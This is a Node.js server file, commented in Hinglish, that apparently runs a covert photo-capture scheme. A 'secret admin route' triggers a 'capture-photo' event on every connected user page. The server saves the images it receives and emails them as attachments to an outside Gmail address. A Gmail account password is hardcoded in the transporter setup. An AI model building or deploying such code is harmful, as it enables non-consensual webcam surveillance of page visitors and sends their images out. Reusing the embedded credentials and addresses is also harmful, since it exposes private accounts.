const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');
const nodemailer = require('nodemailer');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// Folder setup for local uploads
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir);
}

// Static files serve
app.use(express.static(__dirname));
app.use(express.static(path.join(__dirname, 'public')));
app.use('/uploads', express.static(uploadDir));

// Gmail Transporter Setup
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'prectice05@gmail.com',       // 👈 Apni Gmail ID yahan dalein
        pass: 'includestdiosystem'   // 👈 Gmail App Password yahan dalein
    }
});

// ROUTING - Single exact path definition

// 1. Root Route -> Direct User Page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'user.html'));
});

// 2. Secret Admin Route
app.get('/admin.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

// 3. User Route
app.get('/user.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'user.html'));
});

// Socket.io connection logic
io.on('connection', (socket) => {
    console.log('⚡ Connected Device ID:', socket.id);

    socket.on('admin-trigger-capture', () => {
        io.emit('capture-photo');
    });

    socket.on('user-photo-captured', (imageData) => {
        const base64Data = imageData.replace(/^data:image\/png;base64,/, "");
        const fileName = `photo_${Date.now()}.png`;
        const filePath = path.join(uploadDir, fileName);

        fs.writeFile(filePath, base64Data, 'base64', (err) => {
            if (!err) console.log(`✅ Photo Saved: uploads/${fileName}`);
        });

        io.emit('send-photo-to-admin', imageData);

        const mailOptions = {
            from: 'prectice05@gmail.com',  // 👈 Apni Gmail ID
            to: 'md.danish7499@gmail.com',    // 👈 Jis par email mangwana hai
            subject: '📸 New Photo Captured!',
            text: 'User page se new photo capture ho gayi hai.',
            attachments: [{ filename: fileName, content: base64Data, encoding: 'base64' }]
        };

        transporter.sendMail(mailOptions, (error, info) => {
            if (error) console.log('❌ Email Send Error:', error);
            else console.log('📧 Email Sent:', info.response);
        });
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 SERVER RUNNING on port ${PORT}!`);
});